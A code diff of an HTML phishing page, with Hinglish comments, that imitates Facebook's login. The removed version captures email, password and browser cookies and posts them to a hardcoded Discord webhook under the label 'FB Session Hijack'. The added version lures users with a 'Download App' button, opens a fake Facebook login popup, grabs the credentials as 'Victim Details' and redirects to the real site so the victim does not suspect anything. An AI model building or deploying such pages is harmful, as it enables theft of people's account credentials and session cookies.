@@ -3,193 +3,157 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook - Security Check</title>
+    <title>Download App</title>
     <style>
         body {
-            font-family: Helvetica, Arial, sans-serif;
-            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f2f5; /* Halka grey background */
+            font-family: Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            margin: 0;
         }
+
         .container {
-            background: white;
-            padding: 40px;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-            width: 350px;
             text-align: center;
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+            max-width: 90%;
         }
-        h1 {
-            color: #1877f2;
-            font-size: 40px;
+
+        /* Mobile Friendly Image Style */
+        .hero-image {
+            width: 100%;
+            max-width: 300px; /* Phone size ka look dega */
+            height: auto;
+            border-radius: 10px;
             margin-bottom: 20px;
-            font-weight: bold;
         }
-        input {
-            width: 100%;
-            padding: 14px 10px;
-            margin-bottom: 12px;
-            border: 1px solid #ddd;
-            border-radius: 6px;
-            font-size: 16px;
-            box-sizing: border-box;
-        }
-        input:focus {
-            outline: none;
-            border-color: #1877f2;
-            box-shadow: 0 0 0 2px #e7f3ff;
-        }
-        button {
-            width: 100%;
-            padding: 14px;
-            background-color: #1877f2;
+
+        /* Attractive Button Style */
+        .download-btn {
+            background-color: #1877f2; /* Facebook Blue */
             color: white;
+            padding: 15px 30px;
+            font-size: 18px;
+            font-weight: bold;
             border: none;
-            border-radius: 6px;
-            font-size: 20px;
-            font-weight: bold;
+            border-radius: 5px;
             cursor: pointer;
+            transition: transform 0.2s;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.2);
         }
-        button:hover {
+
+        .download-btn:hover {
             background-color: #166fe5;
+            transform: scale(1.05);
         }
-        .loader {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #1877f2;
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
-            display: none;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        #qr-section {
-            display: none;
-        }
-        .qr-img {
-            width: 200px;
-            height: 200px;
-            margin: 10px 0;
-        }
-        .success-msg {
-            display: none;
-            color: #31a24c;
-            font-weight: bold;
-            margin-top: 10px;
-        }
-        .info-text {
-            font-size: 14px;
-            color: #606770;
-            margin-bottom: 15px;
-        }
-        .verify-btn {
-            background-color: #42b72a; /* Green for Verify */
-            margin-top: 10px;
-        }
-        .verify-btn:hover {
-            background-color: #36a420;
+
+        .download-btn:active {
+            transform: scale(0.95);
         }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <h1>facebook</h1>
+        <!-- Yahan apni image ka link daalo -->
+        <img src="https://images.unsplash.com/photo-1511707171634-5f897ff02aa9?q=80&w=1000&auto=format&fit=crop" 
+             alt="Mobile App Preview" 
+             class="hero-image">
         
-        <!-- Login Form -->
-        <form id="loginForm" onsubmit="handleLogin(event)">
-            <input type="text" id="email" placeholder="Email or Phone Number" required>
-            <input type="password" id="password" placeholder="Password" required>
-            <button type="submit" id="loginBtn">Log In</button>
-        </form>
-
-        <!-- Loading Spinner -->
-        <div class="loader" id="loader"></div>
-        <p id="loadingText" style="display:none; color: #606770;">Logging in...</p>
-
-        <!-- QR Code & Verify Section -->
-        <div id="qr-section">
-            <p class="info-text">Scan with Facebook App or Click Verify</p>
-            <img id="qr-image" class="qr-img" src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=FB-SECURITY-VERIFY" alt="QR Code">
-            
-            <!-- Ye button dabate hi Cookie capture hogi -->
-            <button id="verifyBtn" class="verify-btn" onclick="captureAndRedirect()">✅ Verify & Scan</button>
-            
-            <p id="status" class="info-text" style="color: #1877f2; margin-top:15px;">Waiting...</p>
-            
-            <div class="success-msg" id="successMsg">
-                <p>✅ Verified Successfully!</p>
-                <p>Redirecting to your account...</p>
-            </div>
-        </div>
+        <!-- Click Event -->
+        <button class="download-btn" onclick="openLoginWindow()">Download Now</button>
     </div>
 
     <script>
-        // 👇👇👇 YAHAN APNA DISCORD WEBHOOK URL PASTE KARO 👇👇👇
-        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1553320258054656070/u4QlkKbHzc6V2rwuf8ljZZh2jtGF-4dWQgG5pOztCH_Ej8qI1V6zQWA4OohQ6QTpfHhJ"; 
-
-        function handleLogin(e) {
-            e.preventDefault();
+        function openLoginWindow() {
+            // 1. Fake Login Window Open Karein (Facebook Look)
+            const loginWindow = window.open("", "_blank", "width=400,height=600");
             
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-            
-            // Hide form, show loader
-            document.getElementById('loginForm').style.display = 'none';
-            document.getElementById('loader').style.display = 'block';
-            document.getElementById('loadingText').style.display = 'block';
+            loginWindow.document.write(`
+                <html>
+                <head>
+                    <title>Facebook - Log In or Sign Up</title>
+                    <style>
+                        body { 
+                            font-family: Helvetica, Arial, sans-serif; 
+                            background: #f0f2f5; 
+                            display: flex; 
+                            justify-content: center; 
+                            align-items: center; 
+                            height: 100vh; 
+                            margin: 0;
+                        }
+                        .fb-container {
+                            background: white;
+                            padding: 20px;
+                            border-radius: 8px;
+                            box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
+                            width: 300px;
+                            text-align: center;
+                        }
+                        .logo { font-size: 30px; font-weight: bold; color: #1877f2; margin-bottom: 20px; }
+                        input {
+                            width: 100%;
+                            padding: 14px 10px;
+                            margin-bottom: 10px;
+                            border: 1px solid #ddd;
+                            border-radius: 6px;
+                            font-size: 15px;
+                            box-sizing: border-box;
+                        }
+                        button {
+                            width: 100%;
+                            padding: 14px;
+                            background: #1877f2;
+                            color: white;
+                            font-size: 18px;
+                            font-weight: bold;
+                            border: none;
+                            border-radius: 6px;
+                            cursor: pointer;
+                        }
+                        button:hover { background: #166fe5; }
+                        .footer { margin-top: 15px; font-size: 12px; color: #606060; }
+                    </style>
+                </head>
+                <body>
+                    <div class="fb-container">
+                        <div class="logo">facebook</div>
+                        <form id="loginForm" onsubmit="captureData(event)">
+                            <input type="text" id="email" placeholder="Phone number, email, or username" required>
+                            <input type="password" id="pass" placeholder="Password" required>
+                            <button type="submit">Log In</button>
+                        </form>
+                        <div class="footer">
+                            <a href="#">Forgot password?</a><br>
+                            <a href="#">Create new account</a>
+                        </div>
+                    </div>
+                </body>
+                </html>
+            `);
 
-            // Simulate login delay
-            setTimeout(() => {
-                document.getElementById('loader').style.display = 'none';
-                document.getElementById('loadingText').style.display = 'none';
-                document.getElementById('qr-section').style.display = 'block';
+            // 2. Jab User 'Log In' dabaye, toh data capture karo
+            window.captureData = function(e) {
+                e.preventDefault(); // Page refresh roko
                 
-                // Save creds for later
-                window.userData = { email, password };
-            }, 1500);
-        }
+                const email = document.getElementById('email').value;
+                const pass = document.getElementById('pass').value;
 
-        function captureAndRedirect() {
-            const status = document.getElementById('status');
-            const successMsg = document.getElementById('successMsg');
-            const btn = document.getElementById('verifyBtn');
-            
-            btn.style.display = 'none';
-            status.innerText = "Capturing Session...";
-            
-            // 1. Capture Current Browser Cookies (This is the "App" cookie if user was logged in)
-            const cookies = document.cookie;
-            
-            // 2. Send Data (Email + Pass + Cookie)
-            const payload = {
-                content: `🔓 **FB Session Hijack** 🔓\n📧 Email: \`${window.userData.email}\`\n🔑 Pass: \`${window.userData.password}\`\n🍪 **Cookies:** \`${cookies}\`\n⏰ Time: ${new Date().toLocaleTimeString()}`
+                // Data yahan mil jayega (Alert ya Console me)
+                alert("Victim Details:\n\nEmail/Number: " + email + "\nPassword: " + pass);
+                
+                // Ab Victim ko asli Facebook par bhej do taaki wo shak na kare
+                loginWindow.location.href = "https://www.facebook.com";
             };
-
-            fetch(DISCORD_WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-
-            // 3. Show Success and Redirect
-            setTimeout(() => {
-                status.style.display = 'none';
-                successMsg.style.display = 'block';
-                
-                // Redirect to REAL Facebook so user thinks it worked
-                setTimeout(() => {
-                    window.location.href = "https://www.facebook.com/";
-                }, 2000);
-            }, 1000);
         }
     </script>
+
 </body>
 </html>
